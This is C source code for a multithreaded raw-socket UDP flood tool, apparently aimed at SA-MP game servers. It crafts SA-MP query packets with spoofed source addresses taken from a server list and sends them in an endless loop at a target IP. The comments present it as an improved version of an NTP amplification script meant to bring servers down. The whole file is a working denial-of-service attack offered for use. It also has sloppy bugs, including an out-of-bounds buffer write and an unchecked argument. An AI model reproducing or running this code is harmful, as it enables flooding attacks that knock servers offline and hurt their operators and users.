/*Mark 3 in many occasions is much more efficient than Mark1 and Mark2, since the fakes that read them from a list (the smaller, higher speed), in its time, did practice using it to bring down with white list of the servers.
In what it takes deficiency, it is in its checksum completely empty, and it does not automate the 32 bytes like Mark2. */

// Half of the code was extracted from an NTP amplification script 
//(honestly I do not know its creator, but it's a public script under GNU licenses)


#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
unsigned char ip[4];
int destport;
//char *port = "7777";
char contenido[11];
static uint32_t Q[4096], c = 362436;
struct list
{
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};
struct list *head;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
void init_rand(uint32_t x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}
uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
    x++;
    c++;
    }
    return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum = 0;
    for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}
void setup_ip_header(struct iphdr *iph)
{
       char incoming[] = { 0x53, 0x41, 0x4d ,0x50 , 0x9e, 0x45, 0x3a, 0xc0, 0x61, 0x1e, 0x69 };
    int sizedata5 = sizeof(incoming);
    int sizeudpdata5 = sizeof(struct udphdr) + sizedata5;
int sizepacket5 = sizeof(struct iphdr) + sizeudpdata5;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 11);
    iph->id = htonl(random());
    iph->frag_off = 0;  
    iph->ttl = htons(random());
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
}
/*DefiniciÃƒÂ³n de la funciÃƒÂ³n:*/
void makeArrayIP(char* inIP,unsigned char* outIP){
    short i,nTemp=0; char cbool=0;
    for(i=0;inIP[i] != NULL;i++){
        if(inIP[i] != '.'){
            nTemp = nTemp*10 + (short)(inIP[i] - '0');
        }else{
            outIP[cbool] = (char) nTemp;
            nTemp = 0; /*Reiniciar el valor temporal*/
            cbool++;
           }
     
 
    }
    outIP[cbool] = (char) nTemp;
}
 
 
void setup_udp_header(struct udphdr *udph)
{
       char incoming[] = { 0x53, 0x41, 0x4d , 0x50, 0x9e, 0x45, 0x3a, 0xc0, 0x61, 0x1e, 0x69 };
    int sizedata5 = sizeof(incoming);
    int sizeudpdata5 = sizeof(struct udphdr) + 11;
int sizepacket5 = sizeof(struct iphdr) + sizeudpdata5;
    contenido[0] = 0x53;
    contenido[1] = 0x41;
    contenido[2] = 0x4d;
    contenido[3] = 0x50;
    contenido[4] = ip[0];
    contenido[5] = ip[1];
    contenido[6] = ip[2];
    contenido[7] = ip[3];
    //contenido[8] = (7777 + 1) ^ 0xCCCC;
    contenido[8] = (char)(destport & 0xFFFF);
    contenido[9] = (char)(destport >> 8 & 0xFFFF);
    contenido[10] = 0x69;
    udph->source = htons(rand() % 65535 - 48600);
        udph->dest = htons(destport);
        udph->check = 0;
        memcpy((void *)udph + sizeof(struct udphdr), &contenido, sizeof(contenido));
        udph->len=htons(sizeudpdata5);
}
void *flood(void *par1)
{
    char ips[16];
    //int rango = 186;
       char incoming[] = { 0x53, 0x41, 0x4d , 0x50, 0x9e, 0x45, 0x3a, 0xc0, 0x61, 0x1e, 0x69 };
    int sizedata5 = sizeof(incoming);
    int sizeudpdata5 = sizeof(struct udphdr) + sizedata5;
int sizepacket5 = sizeof(struct iphdr) + sizeudpdata5;
 
       char incomingi[] = { 0x08, 0x1e, 0x77, 0xda };
    int sizedata6 = sizeof(incomingi);
    int sizeudpdata6 = sizeof(struct udphdr) + sizedata6;
int sizepacket6 = sizeof(struct iphdr) + sizeudpdata6;
    struct thread_data *td = (struct thread_data *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->sin;
    struct  list *list_node = td->list_node;
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
    fprintf(stderr, "error. got r00t?\n");
    exit(-1);
    }
    init_rand(time(NULL));
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_udp_header(udph);
    udph->source = htons(rand() % 65535 - 48650);
    iph->saddr = list_node->data.sin_addr.s_addr;
    //iph->saddr = inet_addr("192.168.1.4");
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = 0;// csum ((unsigned short *) datagram, iph->tot_len >> 1);
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
    fprintf(stderr, "error. u dun goofed.\n");
    exit(-1);
    }
    init_rand(time(NULL));
    register unsigned int i;
    i = 0;
    while(1){
/*  if(rango =! 181) {
    rango = 186;
    } else if(rango =! 186)
     {
     rango = 181;
    } else
    {
     rango = 181;
    }
*/      //udph->source = htons(rand() % 65535 - 48650);
   // sprintf(ips, "%d.%d.%d.%d\n", 181, rand() % 150, rand() % 200, rand() % 201);
    iph->daddr = sin.sin_addr.s_addr;
//  iph->saddr = inet_addr("192.168.1.4");
    iph->saddr = list_node->data.sin_addr.s_addr;
    iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
    udph->len=htons(sizeof(struct udphdr) + 11); //23
        contenido[10] = 0x69;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 11; //23
        memcpy((void *)udph + sizeof(struct udphdr), &contenido, 11);
        sendto(s, datagram, 39, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
       iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        contenido[10] = 0x72;
        memcpy((void *)udph + sizeof(struct udphdr), &contenido, 11);        
        sendto(s, datagram, 39, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
        contenido[10] = 0x63;
        memcpy((void *)udph + sizeof(struct udphdr), &contenido, 11);
        sendto(s, datagram, 39, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
    iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
    udph->len=htons(sizeof(struct udphdr) + 15); //23
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 15; //23
    contenido[10] = 0x70;
	contenido[11] = (char)(rand() & 0xFFFFFF);
	contenido[12] = (char)(rand() & 0xFFFFFF);
	contenido[13] = (char)(rand() & 0xFFFFFF);
	contenido[14] = (char)(rand() & 0xFFFFFF);
    memcpy((void *)udph + sizeof(struct udphdr), &contenido, 15);
    sendto(s, datagram, 43, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
 iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);    
            udph->len=htons(sizeof(struct udphdr) + 4); //23
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 4; //23
        memcpy((void *)udph + sizeof(struct udphdr), "\x08\x1e\xaa\xda", 4);
      sendto(s, datagram, 32, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
  list_node = list_node->next;
    iph->daddr = sin.sin_addr.s_addr;
    iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
    iph->check = 0;// csum ((unsigned short *) 11, iph->tot_len >> 1);// csum ((unsigned short *) datagram, iph->tot_len >> 1);
    pps++;
	//sleep(1);
    if(i >= limiter)
    {
    i = 0;
    usleep(sleeptime);
    }
    i++;
    }
}
int main(int argc, char *argv[ ])
{
       char incoming[] = { 0x53, 0x41, 0x4d , 0x50, 0x9e, 0x45, 0x3a, 0xc0, 0x61, 0x1e, 0x69 };
    int sizedata5 = sizeof(incoming);
    int sizeudpdata5 = sizeof(struct udphdr) + sizedata5;
    makeArrayIP(argv[1],&ip[0]);
int sizepacket5 = sizeof(struct iphdr) + sizeudpdata5;
    if(argc < 5){
    fprintf(stderr, "Invalid parameters!\n");
    fprintf(stdout, "Usage: %s [IP] [file] [threads] [limiter] [time]\n", argv[0]);
    exit(-1);
    }
    srand(time(NULL));
    int i = 0;
    head = NULL;
    fprintf(stdout, "Query full version 0.5 iniciandose\n");
    int max_len = 128;
    char *buffer = (char *) malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);
    int num_threads = atoi(argv[3]);
    int maxpps = atoi(argv[4]);
    destport = atoi(argv[6]);
    limiter = 0;
    pps = 0;
    int multiplier = 20;
    FILE *list_fd = fopen(argv[2],  "r");
    while (fgets(buffer, max_len, list_fd) != NULL) {
    if ((buffer[strlen(buffer) - 1] == '\n') ||
    (buffer[strlen(buffer) - 1] == '\r')) {
    buffer[strlen(buffer) - 1] = 0x00;
    if(head == NULL)
    {
    head = (struct list *)malloc(sizeof(struct list));
    bzero(&head->data, sizeof(head->data));
    head->data.sin_addr.s_addr=inet_addr(buffer);
    head->next = head;
    head->prev = head;
    } else {
    struct list *new_node = (struct list *)malloc(sizeof(struct list));
    memset(new_node, 0x00, sizeof(struct list));
    new_node->data.sin_addr.s_addr=inet_addr(buffer);
    new_node->prev = head;
    new_node->next = head->next;
    head->next = new_node;
    }
    i++;
    } else {
    continue;
    }
    }
    struct list *current = head->next;
    pthread_t thread[num_threads];
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    struct thread_data td[num_threads];
    for(i = 0;i<num_threads;i++){
    td[i].thread_id = i;
    td[i].sin= sin;
    td[i].list_node = current;
    pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
    }
    fprintf(stdout, "Queryflood iniciado\n");
    for(i = 0;i<(atoi(argv[5])*multiplier);i++)
    {
    usleep((1000/multiplier)*1000);
    if((pps*multiplier) > maxpps)
    {
    if(1 > limiter)
    {
    sleeptime+=100;
    } else {
    limiter--; 
    }
    } else {
    limiter++;
    if(sleeptime > 25)
    {
    sleeptime-=25;
    } else {
    sleeptime = 0;
    }
    }
    pps = 0;
    }
    return 0;
}
